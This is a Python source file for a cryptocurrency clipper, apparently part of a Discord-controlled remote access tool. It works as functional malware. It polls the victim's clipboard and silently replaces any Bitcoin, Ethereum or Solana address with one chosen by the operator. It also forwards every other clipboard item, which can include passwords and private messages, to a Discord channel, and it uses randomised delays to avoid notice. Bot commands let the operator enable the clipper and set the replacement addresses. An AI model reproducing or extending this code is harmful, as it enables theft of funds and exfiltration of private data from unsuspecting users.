import asyncio
import pyperclip
import time
import random
import threading
import queue

data_queue = queue.Queue()
addresses = {'btc': None, 'eth': None, 'sol': None}
last_clipboard = None
monitor_thread = None
clipboard_monitor_active = False

def match_crypto_address(clipboard):
    import re
    btc_match = re.match(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", clipboard)
    eth_match = re.match(r"^0x[a-fA-F0-9]{40}$", clipboard, re.IGNORECASE)
    sol_match = re.match(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$", clipboard)

    if btc_match:
        return 'btc'
    elif eth_match:
        return 'eth'
    elif sol_match:
        return 'sol'

    return None

def monitor_clipboard():
    global last_clipboard, clipboard_monitor_active
    while clipboard_monitor_active:
        try:
            clipboard = str(pyperclip.paste())
        except Exception as e:
            data_queue.put(f"Error accessing clipboard: {e}")
            break

        if clipboard != last_clipboard:
            matched_currency = match_crypto_address(clipboard)

            if matched_currency and addresses[matched_currency]:
                new_address = addresses[matched_currency]
                if clipboard != new_address:
                    pyperclip.copy(new_address)
                    time.sleep(0.1)
                    if pyperclip.paste() == new_address:
                        data_queue.put(f"Detected and replaced {matched_currency.upper()} address.")
            else:
                formatted_message = f"**Clipboard Content:**\n{clipboard}"
                data_queue.put(formatted_message)

            last_clipboard = clipboard

        time.sleep(random.uniform(0.5, 1))

async def process_data_queue(bot, CHANNEL_ID):
    while clipboard_monitor_active:
        if not data_queue.empty():
            data = data_queue.get_nowait()
            await send_data_buffer(data, bot, CHANNEL_ID)
        await asyncio.sleep(random.uniform(1.5, 3))

async def send_data_buffer(data, bot, CHANNEL_ID):
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        if len(data) > 2000:
            chunks = [data[i:i + 2000] for i in range(0, len(data), 2000)]
            for chunk in chunks:
                await channel.send(chunk)
                await asyncio.sleep(random.uniform (2, 3))
        else:
            await channel.send(data)

async def toggle_clipper(bot, CHANNEL_ID, clipper_active):
    global monitor_thread, addresses, clipboard_monitor_active
    if clipper_active:
        clipboard_monitor_active = False
        if monitor_thread is not None:
            monitor_thread.join(timeout=2)
        addresses = {'btc': None, 'eth': None, 'sol': None}
        await send_data_buffer("❌ **CLIPPER DISABLED & CLEARED ADDRESSES**", bot, CHANNEL_ID)
    else:
        clipboard_monitor_active = True  # Set flag to start the thread
        await send_data_buffer("✅ **CLIPPER ENABLED**", bot, CHANNEL_ID)
        # Start clipboard monitoring
        monitor_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        monitor_thread.start()
        asyncio.create_task(process_data_queue(bot, CHANNEL_ID))

async def set_crypto_address(bot, ctx, address, clipper_active):
    global addresses  # Ensure the global 'addresses' dictionary is modified
    if not clipper_active:
        await ctx.send("**Error:** Clipper must be active to set crypto addresses.")
        return

    matched_currency = match_crypto_address(address)
    if not matched_currency:
        await ctx.send(f"**Error:** Invalid address format: `{address}`")
    else:
        addresses[matched_currency] = address
        await ctx.send(f"✅ **{matched_currency.upper()} address set:** `{address}`")

async def list_crypto_addresses(bot, ctx, clipper_active):
    global addresses  # Access the global 'addresses' dictionary
    if not clipper_active:
        await ctx.send("**Error:** Clipper must be active to list crypto addresses.")
        return

    message = (
        f"**BTC Address:**\n`{addresses['btc'] if addresses['btc'] else 'None Set'}`\n"
        f"**ETH Address:**\n`{addresses['eth'] if addresses['eth'] else 'None Set'}`\n"
        f"**SOL Address:**\n`{addresses['sol'] if addresses['sol'] else 'None Set'}`"
    )
    await ctx.send(message)